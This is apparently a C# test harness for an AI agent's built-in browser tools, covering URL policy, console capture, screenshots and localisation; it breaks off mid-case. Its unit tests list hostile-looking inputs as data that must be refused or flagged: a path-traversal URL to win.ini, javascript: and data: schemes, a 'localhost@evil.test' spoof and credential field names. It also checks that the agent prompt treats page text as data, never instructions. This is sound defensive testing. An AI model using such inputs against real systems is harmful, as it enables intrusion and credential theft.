using System.Net.Http;
using System.IO;
using System.Diagnostics;
using System.Management;
using System.Reflection;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using CluadeX.Models;
using CluadeX.Services;
using CluadeX.Services.Browser;
using CluadeX.Services.Tools;
using CluadeX.Services.Vision;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.DependencyInjection.Extensions;

namespace BrowserTest;

/// <summary>
/// The built-in browser contract (team T3): the REAL browser_* tools of the built CluadeX.dll driving the REAL
/// WebView2 engine on its own STA thread, against fixture pages this exe serves itself on 127.0.0.1. No model, no
/// paid API, no internet (the external cases prove nothing was sent), data root isolated next to this exe
/// (portable.txt), WebView2 profile in a temp folder under this exe that is checked for leaked processes at the end.
/// </summary>
internal static partial class Program
{
    static int Pass, Fail, Gaps;
    static readonly List<string> Problems = new();
    static readonly List<(string Id, string Name, string Result, string Detail)> Report = new();
    static string Engine = "webview2";

    static BrowserService Browser = null!;
    static BrowserToolModule Module = null!;
    static ToolModuleContext Ctx = null!;
    static AgentToolService Svc = null!;
    static FixtureServer Server = null!;
    static string Project = "";
    static string BaseUrl = "";
    static readonly List<string> Prompts = new();
    static bool Answer = true;
    static Func<Task>? DuringPrompt;

    [STAThread]
    static int Main(string[] args)
    {
        // This harness checks real command output, so it opts out of the default dry-run on purpose (ProcessLaunchPolicy).
        // A new harness must not copy this line unless real runs are its point; the guards still check every command.
        CluadeX.Services.Safety.ProcessLaunchPolicy.DryRun = false;
        var stdout = new StreamWriter(Console.OpenStandardOutput(), new UTF8Encoding(false)) { AutoFlush = true };
        Console.SetOut(stdout);
        if (args.Length >= 3 && args[0] == "--serve")
        {
            using var s = new FixtureServer(args[2], int.Parse(args[1]));
            Console.WriteLine($"serving {args[2]} on http://127.0.0.1:{s.Port}/");
            Thread.Sleep(Timeout.Infinite);
            return 0;
        }
        // The preview pane cases need a WPF Application with CluadeX's resources on this thread (child process).
        if (args.Length >= 1 && args[0] == "--ui") return UiSuite.Start();
        try { return Run().GetAwaiter().GetResult(); }
        catch (Exception ex) { Console.WriteLine("FATAL " + ex); return 2; }
    }

    /// <summary>The "*.ext.test" names the harness uses for EXTERNAL sites all resolve to this machine's fixture
    /// server: the engine never sends a byte to the internet, and the server's log proves what was (not) sent.</summary>
    internal const string HostRules = "--host-resolver-rules=\"MAP *.ext.test 127.0.0.1\"";

    // ─────────────────────────── reporting ───────────────────────────

    static void Check(string id, string name, bool ok, string detail = "")
    {
        Report.Add((id, name, ok ? "PASS" : "FAIL", ok ? "" : Trunc(detail, 300)));
        if (ok) { Pass++; Console.WriteLine($"  PASS {id,-5} {name}"); return; }
        Fail++; Problems.Add($"FAIL {id} {name}");
        Console.WriteLine($"  FAIL {id,-5} {name}");
        if (detail.Length > 0) Console.WriteLine("            " + Trunc(detail, 900).Replace("\n", "\n            "));
    }

    static void Gap(string id, string name, string why)
    {
        Gaps++;
        Report.Add((id, name, "GAP", why));
        Console.WriteLine($"  GAP  {id,-5} {name} — {why}");
    }

    static async Task Case(string id, Func<Task> body)
    {
        try { await body(); }
        catch (Exception ex)
        {
            Fail++; Problems.Add($"FAIL {id} threw {ex.GetType().Name}");
            Report.Add((id, "harness case threw", "FAIL", ex.GetType().Name + ": " + Trunc(ex.Message, 200)));
            Console.WriteLine($"  FAIL {id,-5} harness case threw: {ex.GetType().Name}: {Trunc(ex.Message, 400)}");
        }
    }

    static string Trunc(string? s, int n) => s == null ? "" : (s.Length <= n ? s : s[..n] + $"…(+{s.Length - n})");
    static string Seen(ToolResult r) => r.Success ? r.Output ?? "" : string.Join("\n", new[] { r.Error, r.Output }.Where(s => !string.IsNullOrEmpty(s)));

    // ─────────────────────────── calling the tools ───────────────────────────

    static async Task<ToolResult> T(string tool, params (string k, string v)[] args) => await TIn(Ctx, tool, args);

    static async Task<ToolResult> TIn(ToolModuleContext ctx, string tool, params (string k, string v)[] args)
    {
        var type = Module.ResolveToolType(tool) ?? throw new Exception("tool name did not resolve: " + tool);
        var call = new ToolCall { Type = type, ToolName = tool, Arguments = args.ToDictionary(a => a.k, a => a.v) };
        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(90));
        return await Module.ExecuteAsync(call, ctx, cts.Token);
    }

    /// <summary>The text between the page-data envelope markers (or the whole text).</summary>
    internal static string Body(string s) => UrlPolicy.EnvelopeBody(s) ?? s.Trim();

    static async Task<string> E(string expression, ToolModuleContext? ctx = null)
    {
        var r = await TIn(ctx ?? Ctx, "browser_eval", ("expression", expression));
        return r.Success ? Body(r.Output) : "ERROR: " + Seen(r);
    }

    /// <summary>requestAnimationFrame callbacks in 500 ms (-1 = none at all: the page's frame loop is not running).</summary>
    static async Task<int> Frames(ToolModuleContext? ctx = null)
    {
        var r = await TIn(ctx ?? Ctx, "browser_eval", ("timeout_ms", "3000"), ("expression",
            "await new Promise(res => { let n = 0; const t0 = performance.now(); requestAnimationFrame(function f() { n++; if (performance.now() - t0 < 500) requestAnimationFrame(f); else res(n); }); setTimeout(() => res(n || -1), 2500); })"));
        return r.Success && int.TryParse(Body(r.Output), out var n) ? n : -2;
    }

    static string Img(double css) => (css * (Browser.Session?.LastShot?.PxPerCssX ?? 1)).ToString("0.##", System.Globalization.CultureInfo.InvariantCulture);
    static string N(double v) => v.ToString("0.##", System.Globalization.CultureInfo.InvariantCulture);

    static async Task<bool> WaitUntil(Func<bool> cond, int ms)
    {
        var sw = Stopwatch.StartNew();
        while (sw.ElapsedMilliseconds < ms) { if (cond()) return true; await Task.Delay(100); }
        return cond();
    }

    // ─────────────────────────── run ───────────────────────────

    static async Task<int> Run()
    {
        string exeDir = AppContext.BaseDirectory.TrimEnd('\\');
        var configure = typeof(CluadeX.App).GetMethod("ConfigureServices", BindingFlags.NonPublic | BindingFlags.Static)!;
        var services = new ServiceCollection();
        configure.Invoke(null, new object[] { services });

        // The harness's own engine: own STA thread, temp profile under this exe (E:, never the user's), GPU on, and
        // every *.ext.test name mapped onto this machine (the "external" sites are the fixture server).
        string udf = Path.Combine(exeDir, "udf-" + Guid.NewGuid().ToString("N")[..8]);
        Udf = udf;
        ExeDir = exeDir;
        // The real settings (the isolated data root) so the "sites outside this PC" setting applies as in the app.
        var browserOptions = new BrowserServiceOptions { UserDataFolder = udf, DisableGpu = false, ExtraArguments = HostRules };
        var images = new ToolImageStore(Path.Combine(exeDir, "screens"));
        if (Directory.Exists(Path.Combine(exeDir, "screens"))) try { Directory.Delete(Path.Combine(exeDir, "screens"), true); } catch { }
        services.Replace(ServiceDescriptor.Singleton(sp => new BrowserService(sp.GetRequiredService<SettingsService>(), browserOptions)));
        // The real module, with the license gate opened (the free tier would refuse every call) — the engine
        // check, permissions and everything else are the shipping code.
        services.Replace(ServiceDescriptor.Singleton(sp => new BrowserToolModule(sp.GetRequiredService<BrowserService>(), sp.GetRequiredService<SettingsService>(), null, images,
            sp.GetRequiredService<FileSystemService>(), null, null, _ => null)));
        using var provider = services.BuildServiceProvider();
        Browser = provider.GetRequiredService<BrowserService>();

        var settings = provider.GetRequiredService<SettingsService>();
        Console.WriteLine($"data root : {settings.DataRoot}");
        if (!settings.DataRoot.StartsWith(exeDir, StringComparison.OrdinalIgnoreCase))
        {
            Console.WriteLine("ABORT: data root is not isolated (portable.txt missing) — refusing to touch real user data.");
            return 3;
        }
        LocalizedResources.Instance.Initialize(provider.GetRequiredService<LocalizationService>());

        Project = Path.Combine(exeDir, "browser-project");
        if (Directory.Exists(Project)) Directory.Delete(Project, true);
        Directory.CreateDirectory(Project);

        Server = new FixtureServer(Project);
        BaseUrl = $"http://127.0.0.1:{Server.Port}";
        File.WriteAllText(Path.Combine(Project, "index.html"), FixtureServer.IndexHtml.Replace("__EXT__", Server.Ext("site")), new UTF8Encoding(false));
        File.WriteAllText(Path.Combine(Project, "other.html"), FixtureServer.OtherHtml, new UTF8Encoding(false));
        File.WriteAllText(Path.Combine(Project, "mods.html"),
            "<!doctype html><html><head><meta charset=\"utf-8\"><title>mods</title></head><body><script type=\"module\" src=\"/mods/m0.js\"></script></body></html>",
            new UTF8Encoding(false));
        // Mocks prove themselves before anything relies on them.
        using (var http = new HttpClient { Timeout = TimeSpan.FromSeconds(5) })
        {
            string ping = await http.GetStringAsync(BaseUrl + "/api/ping");
            if (!ping.Contains("\"ok\":true")) { Console.WriteLine("ABORT: fixture server did not answer its own marker"); return 3; }
        }

        var fs = provider.GetRequiredService<FileSystemService>();
        fs.WorkingDirectory = Project;
        var hooks = provider.GetRequiredService<HookService>();
        typeof(HookService).GetField("_cachedHooks", BindingFlags.NonPublic | BindingFlags.Instance)?.SetValue(hooks, new List<HookDefinition>());
        Svc = provider.GetRequiredService<AgentToolService>();
        Svc.OnPermissionRequired += async info =>
        {
            lock (Prompts) Prompts.Add(info.Detail);
            // A case can make something happen while the "user" looks at the prompt (the page navigating meanwhile).
            if (Interlocked.Exchange(ref DuringPrompt, null) is { } during) await during();
            return Answer;
        };
        Module = provider.GetRequiredService<BrowserToolModule>();
        Ctx = new ToolModuleContext { SessionKey = "browsertest", WorkingDirectory = Project, ShellDirectory = Project, OutputBudgetChars = 30_000 };

        var info = BrowserEngineProbe.Probe(refresh: true);
        Console.WriteLine($"engine    : {(info.HasWebView2 ? "WebView2 " + info.WebView2Version : "NONE")} · {info.Summary}");
        Console.WriteLine($"fixtures  : {BaseUrl}/  ({Project})");
        Console.WriteLine($"profile   : {udf}\n");
        if (!info.HasWebView2)
        {
            Gap("W*", "every engine case", "the WebView2 runtime is not installed: " + BrowserEngineProbe.InstallCommand);
            return Finish(exeDir);
        }

        var perms = provider.GetRequiredService<PermissionService>();
        var loc = provider.GetRequiredService<LocalizationService>();
        var activation = provider.GetRequiredService<ActivationService>();
        Perms = perms;
        Loc = loc;
        Settings = settings;
        // The same user-rule lookup the DI registration wires (G3 proves the registration has it).
        Browser.UrlRule = url => perms.FindUrlRule(url, "browse", "browser_open", legacyResource: "browser_open");

        Console.WriteLine("── gate, schemas, policy (no engine) ──");
        await Case("G1", () => GateCases(settings, activation, loc, fs, images));
        await Case("G2", () => SchemaCases());
        await Case("G3", () => RegistrationCases());
        await Case("P1", () => PolicyUnitCases());
        await Case("P2", () => PolicyUnitCases2());
        await Case("X1", () => StaticXamlCases(loc));
        await Case("V1", () => ViewModelCases(provider));

        Console.WriteLine("\n── engine cases (WebView2, page hidden off-screen the whole time) ──");
        await Case("W1", W1);
        await Case("W2", W2);
        await Case("W3", W3);
        await Case("W4", W4);
        await Case("W5", W5);
        await Case("W6", W6);
        await Case("W7", W7);
        await Case("W8", W8);
        await Case("IN1", IN1);
        await Case("W9", W9);
        await Case("W10", W10);
        await Case("W11", W11);
        await Case("W12", W12);
        await Case("W13", () => W13(perms));
        Console.WriteLine("\n── review fixes: egress, privacy, keys, IDN, redirects, side effects, robustness ──");
        await Case("E1", E1);
        Console.WriteLine("\n── round 2: the page's own service worker, nested workers, the gate's page ──");
        await Case("SW", SW);
        await Case("NW1", NW1);
        await Case("PV1", PV1);
        await Case("GT1", GT1);
        await Case("K1", K1);
        await Case("ID1", ID1);
        await Case("RD1", RD1);
        await Case("SS1", SS1);
        await Case("EN1", EN1);
        await Case("RX1", RX1);
        await Case("PR1", PR1);
        await Case("W14", W14);
        await Case("W15", W15);
        await Case("PF1", PF1);
        await Case("S1", S1);
        await Case("I1", I1);
        await Case("GP1", GP1);
        await Case("L1", L1);
        await Case("W16", () => W16(udf));

        Server.Dispose();
        try { Directory.Delete(Project, true); } catch { }
        try { Directory.Delete(udf, true); } catch { }

        Console.WriteLine("\n── preview pane (real WPF panes, off-screen, never activated — child process) ──");
        RunUiSuite();
        return Finish(exeDir);
    }

    static string Udf = "";
    static string ExeDir = "";
    static PermissionService Perms = null!;
    static LocalizationService Loc = null!;
    static SettingsService Settings = null!;

    static int Finish(string exeDir)
    {
        var md = new StringBuilder("# browsertest report\n\n| Case | Engine | Result | Check | Detail |\n|---|---|---|---|---|\n");
        foreach (var (id, name, result, detail) in Report)
            md.Append($"| {id} | {Engine} | {result} | {name.Replace("|", "/")} | {detail.Replace("|", "/").Replace("\n", " ")} |\n");
        md.Append($"\n{Pass} pass · {Fail} fail · {Gaps} gap\n");
        File.WriteAllText(Path.Combine(exeDir, "browser-report.md"), md.ToString());
        Console.WriteLine($"\n═══ {Pass} pass · {Fail} FAIL · {Gaps} GAP ═══ (report: {Path.Combine(exeDir, "browser-report.md")})");
        foreach (var p in Problems) Console.WriteLine("   " + p);
        return Fail == 0 ? 0 : 1;
    }

    // ═══════════════════════ gate / schema / policy / static ═══════════════════════

    static Task GateCases(SettingsService settings, ActivationService activation, LocalizationService loc, FileSystemService fs, ToolImageStore images)
    {
        var real = new BrowserToolModule(Browser, settings, activation, images, fs);
        bool free = !activation.IsFeatureUnlocked(DevPreviewGate.FeatureKey);
        if (free)
        {
            string en = real.GetRefusal(ToolType.BrowserOpen) ?? "";
            loc.SetLanguage("th");
            string th = real.GetRefusal(ToolType.BrowserOpen) ?? "";
            loc.SetLanguage("en");
            Check("G1", "free tier: the real gate refuses browser_open naming the reason and the free trial (en)",
                en.Length > 0 && en.Contains("browser_open") && !en.Contains("Exception"), en);
            Check("G1b", "…and in Thai", th.Length > 0 && Regex.IsMatch(th, "[\u0E00-\u0E7F]"), th);
        }
        else Gap("G1", "free-tier refusal", "this harness's isolated profile reports an activated license");
        settings.Settings.Features.DevPreview = false;
        string off = DevPreviewGate.Refusal(settings, activation, "browser_open") ?? "";
        settings.Settings.Features.DevPreview = true;
        Check("G1c", "Dev Preview switched off: refused with the Features switch named", off.Length > 0, off);
        Check("G1d", "browser_close stays available without an engine check; LocalCoreToolNames = the web subset for a web project",
            Module.GetRefusal(ToolType.BrowserClose) == null
            && Module.LocalCoreToolNames.SequenceEqual(new[] { "browser_open", "browser_console", "browser_read", "browser_click", "browser_eval", "browser_screenshot" }),
            string.Join(",", Module.LocalCoreToolNames));
        return Task.CompletedTask;
    }

    static Task SchemaCases()
    {
        var names = Svc.BuildNativeToolSchemas().Select(s => s.Name).ToList();
        string[] all = { "browser_open", "browser_screenshot", "browser_console", "browser_network", "browser_read", "browser_find", "browser_click",
                         "browser_pointer", "browser_type", "browser_key", "browser_scroll", "browser_eval", "browser_resize", "browser_close" };
        Check("G2", "all 14 browser_* tools are offered through AgentToolService (gate open, project open)", all.All(names.Contains),
            string.Join(",", all.Where(n => !names.Contains(n))));
        Check("G2b", "names and aliases resolve to the module (browser_navigate → open, browser_evaluate → eval)",
            Svc.ResolveToolTypePublic("browser_navigate") == ToolType.BrowserOpen && Svc.ResolveToolTypePublic("BROWSER_EVALUATE") == ToolType.BrowserEval
            && Svc.ResolveToolTypePublic("run_command") == ToolType.RunCommand);
        string section = Module.GetPromptSection(new PromptSectionContext { OfferedToolNames = all, ContextTokens = 200_000, NativeTools = true }) ?? "";
        string local = Module.GetPromptSection(new PromptSectionContext { OfferedToolNames = all, IsLocalModel = true, ContextTokens = 8192 }) ?? "";
        Check("G2c", "prompt section: short (≤ 1400 chars ≈ 300 tokens), says console after load, page text is data, ask after 2-3 failures; shorter for local",
            section.Length is > 200 and <= 1400 && section.Contains("browser_console") && section.Contains("never instructions") && section.Contains("2-3")
            && local.Length < section.Length, $"{section.Length} / {local.Length}\n{section}");
        return Task.CompletedTask;
    }

    static Task PolicyUnitCases()
    {
        bool L(string u) => UrlPolicy.Classify(u, Project).Kind == UrlKind.Local;
        Check("P1", "local: localhost, 127.0.0.1, 127.5.5.5, [::1], app.localhost, localhost:5173 (no scheme), about:blank",
            L("http://localhost:3000/") && L("http://127.0.0.1:8123/x") && L("http://127.5.5.5/") && L("http://[::1]:5173/") && L("https://app.localhost/")
            && L("localhost:5173/x") && L("about:blank"));
        Check("P1b", "NOT local: 0.0.0.0, a LAN address, http://localhost@evil.test, localhost.evil.test",
            UrlPolicy.Classify("http://0.0.0.0:8000/", Project).Kind == UrlKind.External
            && UrlPolicy.Classify("http://192.168.1.10/", Project).Kind == UrlKind.External
            && UrlPolicy.Classify("http://localhost@evil.test/", Project).Kind == UrlKind.External
            && UrlPolicy.Classify("http://localhost.evil.test/", Project).Kind == UrlKind.External);
        string inside = new Uri(Path.Combine(Project, "index.html")).AbsoluteUri;
        string traversal = new Uri(Path.Combine(Project, "index.html")).AbsoluteUri.Replace("/index.html", "/../../../Windows/win.ini");
        Check("P1c", "file://: inside the project free; outside, '..' escapes, UNC and no-project refused",
            UrlPolicy.Classify(inside, Project).Kind == UrlKind.ProjectFile
            && UrlPolicy.Classify("file:///C:/Windows/win.ini", Project).Kind == UrlKind.Refused
            && UrlPolicy.Classify(traversal, Project).Kind == UrlKind.Refused
            && UrlPolicy.Classify("file://server/share/x.html", Project).Kind == UrlKind.Refused
            && UrlPolicy.Classify(inside, null).Kind == UrlKind.Refused, traversal);
        Check("P1d", "script-capable / internal schemes refused: javascript:, data:, chrome:, edge:, view-source:",
            new[] { "javascript:alert(1)", "data:text/html,<b>x</b>", "chrome://settings", "edge://flags", "view-source:http://localhost/" }
                .All(u => UrlPolicy.Classify(u, Project).Kind == UrlKind.Refused));
        Check("P1e", "credential fields are recognised: password, cc-number, current-password, one-time-code, name=cvv; a plain name field is not",
            UrlPolicy.IsSensitiveField("password", "", "") && UrlPolicy.IsSensitiveField("text", "cc-number", "") && UrlPolicy.IsSensitiveField("text", "current-password", "")
            && UrlPolicy.IsSensitiveField("text", "one-time-code", "") && UrlPolicy.IsSensitiveField("text", "", "cvv") && !UrlPolicy.IsSensitiveField("text", "off", "player"));
        Check("P1f", "key table: ArrowLeft (37), Space (' ', Space, 32), ctrl+a (modifier 2), Shift+Tab, F5 (116), Thai character",
            InputDispatcher.Parse("ArrowLeft") is { Key.VirtualKey: 37, Key.Code: "ArrowLeft" }
            && InputDispatcher.Parse("Space") is { Key.Key: " ", Key.Code: "Space", Key.VirtualKey: 32 }
            && InputDispatcher.Parse("ctrl+a") is { Modifiers: 2, Key.Code: "KeyA" }
            && InputDispatcher.Parse("Shift+Tab") is { Modifiers: 8, Key.Key: "Tab" }
            && InputDispatcher.Parse("F5") is { Key.VirtualKey: 116 }
            && InputDispatcher.Parse("ก") is { Key.Text: "ก" } && InputDispatcher.Parse("nope+x") == null);
        double s1 = ScreenshotPipeline.Scale(1280, 800, 1, 1568), s2 = ScreenshotPipeline.Scale(375, 812, 3, 1568), s3 = ScreenshotPipeline.Scale(1280, 3000, 1, 1568);
        Check("P1g", "screenshot scale keeps ≤1568 long edge and ≤1.15 MP (1280×800@1, 375×812@3, 1280×3000@1)",
            1280 * s1 <= 1568 && 1280 * 800 * s1 * s1 <= 1_150_000 && 812 * 3 * s2 <= 1568 && 375 * 812 * 9 * s2 * s2 <= 1_150_000
            && 3000 * s3 <= 1568 && 1280 * 3000 * s3 * s3 <= 1_150_000, $"{s1} {s2} {s3}");
        return Task.CompletedTask;
    }

    /// <summary>The static checks the owner runs after XAML changes, for the files this team added/changed.</summary>
    static Task StaticXamlCases(LocalizationService loc)
    {
        string? repo = FindRepo();
        if (repo == null) { Gap("X1", "static XAML checks", "repository source not found next to the harness"); return Task.CompletedTask; }
        var files = new[] { @"CluadeX\Views\Preview\PreviewPane.xaml", @"CluadeX\Views\Preview\PreviewWindow.xaml", @"CluadeX\Views\CodeEditorView.xaml", @"CluadeX\Views\FeaturesView.xaml" };
        var missingLoc = new List<string>();
        var missingRes = new List<string>();
        var badBindings = new List<string>();
        string resources = File.ReadAllText(Path.Combine(repo, @"CluadeX\Resources\Theme.xaml")) + File.ReadAllText(Path.Combine(repo, @"CluadeX\App.xaml"));
        loc.SetLanguage("th");
        foreach (var f in files)
        {
            string xaml = File.ReadAllText(Path.Combine(repo, f));
            foreach (Match m in Regex.Matches(xaml, @"\{services:Loc\s+([\w.]+)\}"))
            {
                string key = m.Groups[1].Value;
                string th = loc.T(key);
                if (th == key || !Regex.IsMatch(th, "[\u0E00-\u0E7F]") && !IsLatinOk(key)) missingLoc.Add($"{Path.GetFileName(f)}:{key}");
            }
            foreach (Match m in Regex.Matches(xaml, @"\{StaticResource\s+([\w.]+)\}"))
            {
                string key = m.Groups[1].Value;
                if (!Regex.IsMatch(resources, $"x:Key=\"{Regex.Escape(key)}\"") && !Regex.IsMatch(xaml, $"x:Key=\"{Regex.Escape(key)}\""))
                    missingRes.Add($"{Path.GetFileName(f)}:{key}");
            }
            if (f.Contains("Preview"))
                foreach (Match m in Regex.Matches(xaml, @"\{Binding\s+(?:Path=)?([\w.]+)"))
                {
                    string path = m.Groups[1].Value.Split('.')[0];
                    if (path is "IsChecked") continue;   // ElementName bindings
                    var t = path is "Text" or "IsError" or "IsWarning" ? typeof(CluadeX.ViewModels.PreviewConsoleLine) : typeof(CluadeX.ViewModels.PreviewViewModel);
                    if (t.GetProperty(path) == null) badBindings.Add($"{Path.GetFileName(f)}:{path}");
                }
        }
        loc.SetLanguage("en");
        Check("X1", "every {services:Loc} key in the preview XAML (+ the edited workbench/Features views) has a Thai value", missingLoc.Count == 0, string.Join(", ", missingLoc));
        Check("X1b", "every {StaticResource} in those files exists (Theme.xaml / App.xaml / local)", missingRes.Count == 0, string.Join(", ", missingRes));
        Check("X1c", "every {Binding} in the preview XAML resolves to a PreviewViewModel / console-line property", badBindings.Count == 0, string.Join(", ", badBindings));

        // Every key the browser code asks for exists in en AND th.
        var keys = new HashSet<string>();
        foreach (var dir in new[] { @"CluadeX\Services\Browser", @"CluadeX\ViewModels", @"CluadeX\Views\Preview" })
            foreach (var cs in Directory.EnumerateFiles(Path.Combine(repo, dir), "*.cs"))
            {
                string code = File.ReadAllText(cs);
                if (!code.Contains("Browser", StringComparison.Ordinal) && !code.Contains("Preview", StringComparison.Ordinal)) continue;
                foreach (Match m in Regex.Matches(code, @"(?:\bL|_loc\.T)\(""((?:browser|preview|devPreview)\.[\w.]+)""\)")) keys.Add(m.Groups[1].Value);
            }
        var notBoth = new List<string>();
        foreach (var k in keys)
        {
            loc.SetLanguage("en"); string en = loc.T(k);
            loc.SetLanguage("th"); string th = loc.T(k);
            if (en == k || th == k || !Regex.IsMatch(th, "[\u0E00-\u0E7F]")) notBoth.Add(k);
        }
        loc.SetLanguage("en");
        Check("X1d", $"all {keys.Count} browser/preview keys used in code have en + Thai values", keys.Count > 30 && notBoth.Count == 0, string.Join(", ", notBoth));
        return Task.CompletedTask;
    }

    static bool IsLatinOk(string key) => key is "preview.title";

    static string? FindRepo()
    {
        var d = new DirectoryInfo(AppContext.BaseDirectory);
        while (d != null && !File.Exists(Path.Combine(d.FullName, @"CluadeX\CluadeX.csproj"))) d = d.Parent;
        return d?.FullName;
    }

    // ═══════════════════════ engine cases ═══════════════════════

    static async Task W1()
    {
        var r = await T("browser_open", ("url", BaseUrl + "/index.html"));
        Check("W1", "browser_open: HTTP 200, title, engine webview2", r.Success && r.Output.Contains("HTTP 200") && r.Output.Contains("title \"Fixture Snooker\"") && r.Output.Contains("engine webview2"), Seen(r));
        await Task.Delay(600);
        var c = await T("browser_console", ("since", "navigation"), ("limit", "200"));
        string con = Body(c.Output);
        Check("W1b", "'boot' from a <head> script is in the console — capture started before navigation", con.Contains("[log] boot"), con);
        Check("W1c", "errors: console.error('deliberate'), uncaught-x WITH file:line, the rejection, the missing.png 404",
            con.Contains("deliberate") && Regex.IsMatch(con, @"uncaught-x.*index\.html:\d+") && con.Contains("rejected-y") && Regex.IsMatch(con, @"404[\s\S]*missing\.png|missing\.png[\s\S]*404"), con);
        var m = Regex.Match(r.Output, @"Console since load: (\d+) error");
        Check("W1d", "browser_open's own summary counts the errors (≥ 2) and lists the first ones inside the page-data envelope",
            m.Success && int.Parse(m.Groups[1].Value) >= 2 && r.Output.Contains(UrlPolicy.EnvelopeOpenPrefix) && r.Output.Contains("deliberate"), r.Output);
        var img = r.Images?.FirstOrDefault();
        Check("W1e", "browser_open attached a screenshot (base64 only in Images, never in Output) saved as a JPEG file",
            img != null && File.Exists(img.FilePath) && !r.Output.Contains(img.Base64[..Math.Min(40, img.Base64.Length)]) && r.Output.Contains("[image 1:"), img?.ToString() ?? "no image");
        Check("W1f", "the page came from this exe's loopback server (index.html and the 404 missing.png requested)",
            Server.Requests.Contains("/index.html") && Server.Requests.Contains("/missing.png"), string.Join(",", Server.Requests));
    }

    static async Task W2()
    {
        var err = await T("browser_console", ("level", "error"));
        var lines = Body(err.Output).Split('\n', StringSplitOptions.RemoveEmptyEntries);
        Check("W2", "level=error shows only errors", lines.Length >= 2 && lines.Where(l => l.StartsWith('[')).All(l => l.StartsWith("[error]")), err.Output);
        var pat = await T("browser_console", ("pattern", "deliber"));
        Check("W2b", "pattern filters to the one matching line", Body(pat.Output).Split('\n').Count(l => l.StartsWith('[')) == 1 && pat.Output.Contains("deliberate"), pat.Output);
        await T("browser_console", ("since", "last"));
        await E("console.log('fresh-1'); 1");
        await Task.Delay(300);
        var last = await T("browser_console", ("since", "last"));
        Check("W2c", "since=last returns only what is new since the previous read", last.Output.Contains("fresh-1") && !last.Output.Contains("boot"), last.Output);
        await T("browser_console", ("clear", "true"));
        var cleared = await T("browser_console");
        Check("W2d", "clear=true forgets what was shown", cleared.Output.Contains(": 0 line(s)"), cleared.Output);

        await E("document.getElementById('spam').click(); 1");
        var session = Browser.Session!;
        await WaitUntil(() => { var s = session.Console.Read("probe-spam", "start", "all", "^spam$", 5, out _, out _); return s.Count == 1 && s[0].Count >= 10_000; }, 20_000);
        var spam = await T("browser_console", ("pattern", "^spam$"));
        Check("W2e", "10,000 identical lines fold into ONE entry shown as ×10000", Regex.IsMatch(spam.Output, @"\[log\] spam\b.*×10000"), spam.Output);
        await E("for (let i = 0; i < 2500; i++) console.log('line ' + i); 1");
        long prev = -1;
        await WaitUntil(() => { session.Console.Pump(); var t = session.Console.Tail(1); bool done = t.Count == 1 && t[0].Text == "line 2499"; long v = session.Console.Version; bool stable = done && v == prev; prev = v; return stable; }, 20_000);
        var all = session.Console.Read("probe", "start", "all", null, 100_000, out _, out _);
        Check("W2f", $"the buffer stays bounded: {all.Count} entries kept (≤ {ConsoleBuffer.MaxEntries}), oldest dropped",
            all.Count <= ConsoleBuffer.MaxEntries && session.Console.Evicted > 0 && all.Last().Text == "line 2499", $"count={all.Count} evicted={session.Console.Evicted} last={all.LastOrDefault()?.Text}");
        var tail = await T("browser_console", ("limit", "5"));
        Check("W2g", "the default read is limited and says how many older lines were not shown", tail.Output.Contains("not shown") && Body(tail.Output).Split('\n').Count(l => l.StartsWith('[')) == 5, tail.Output);
        await T("browser_console", ("clear", "true"));
    }

    static async Task W3()
    {
        var a = await T("browser_screenshot");
        var img = a.Images?.FirstOrDefault();
        bool jpeg = false; PixelFrame? px = null;
        if (img != null)
        {
            var bytes = Convert.FromBase64String(img.Base64);
            jpeg = bytes.Length > 3 && bytes[0] == 0xFF && bytes[1] == 0xD8;
            px = PixelFrame.Decode(bytes);
        }
        Check("W3", "the screenshot decodes as JPEG, long edge ≤ 1568, ≤ 1.15 MP", jpeg && px != null && Math.Max(px.Width, px.Height) <= 1568 && px.Width * px.Height <= 1_150_000,
            px == null ? Seen(a) : $"{px.Width}x{px.Height}");
        var shot = Browser.Session!.LastShot!;
        var (R, G, B) = px!.At((int)Math.Round(75 * shot.PxPerCssX), (int)Math.Round(75 * shot.PxPerCssY));
        Check("W3b", "the pixel at the image point mapped from CSS (75,75) is red (the canvas square) — the mapping is right", R > 200 && G < 70 && B < 70, $"rgb({R},{G},{B}) k={shot.PxPerCssX}");
        Check("W3c", "the digest says the canvas is NOT blank and names dominant colours", Regex.IsMatch(a.Output, @"Canvas #game.*NOT blank") && a.Output.Contains("dominant colours"), a.Output);

        await Task.Delay(300);
        var b = await T("browser_screenshot");
        var ch = Regex.Match(b.Output, @"Changed since the previous screenshot: ([\d.]+)%");
        Check("W3d", "two shots 300 ms apart report motion while the page is hidden off-screen (rAF not throttled)",
            ch.Success && double.Parse(ch.Groups[1].Value, System.Globalization.CultureInfo.InvariantCulture) > 0 && Regex.IsMatch(b.Output, @"Canvas #game.*\(animating\)"), b.Output);
        var frames1 = await E("window.__frames"); await Task.Delay(500); var frames2 = await E("window.__frames");
        Check("W3e", "requestAnimationFrame keeps ticking off-screen (≥ 15 frames in 500 ms)",
            int.TryParse(frames1, out var f1) && int.TryParse(frames2, out var f2) && f2 - f1 >= 15 && await E("document.hidden") == "false", $"{frames1} → {frames2}");

        var full = await T("browser_screenshot", ("full_page", "true"));
        var fimg = full.Images?.FirstOrDefault();
        Check("W3f", "full_page of the ~3300 px page stays ≤ 1568 long edge and ≤ 1.15 MP (and is taller than wide)",
            fimg != null && Math.Max(fimg.Width, fimg.Height) <= 1568 && fimg.Width * fimg.Height <= 1_150_000 && fimg.Height > fimg.Width, fimg?.ToString() ?? Seen(full));

        var channel = Browser.Channel!;
        await channel.Dispatcher.InvokeAsync(() => channel.SetRasterizationScale(1.5));
        await Task.Delay(400);
        try
        {
            var hi = await T("browser_screenshot");
            var himg = hi.Images?.FirstOrDefault();
            var hpx = himg != null ? PixelFrame.Decode(Convert.FromBase64String(himg.Base64)) : null;
            var hshot = Browser.Session!.LastShot!;
            var hp = hpx?.At((int)Math.Round(75 * hshot.PxPerCssX), (int)Math.Round(75 * hshot.PxPerCssY));
            Check("W3g", "at RasterizationScale 1.5: DPR 1.5, limits kept, CSS (75,75) still maps onto red",
                hpx != null && hi.Output.Contains("DPR 1.5") && Math.Max(hpx.Width, hpx.Height) <= 1568 && hpx.Width * hpx.Height <= 1_150_000
                && hp is { R: > 200, G: < 70, B: < 70 }, $"{hi.Output.Split('\n')[0]} rgb={hp}");
        }
        finally
        {
            await channel.Dispatcher.InvokeAsync(() => channel.SetRasterizationScale(1.0));
            await Task.Delay(300);
        }
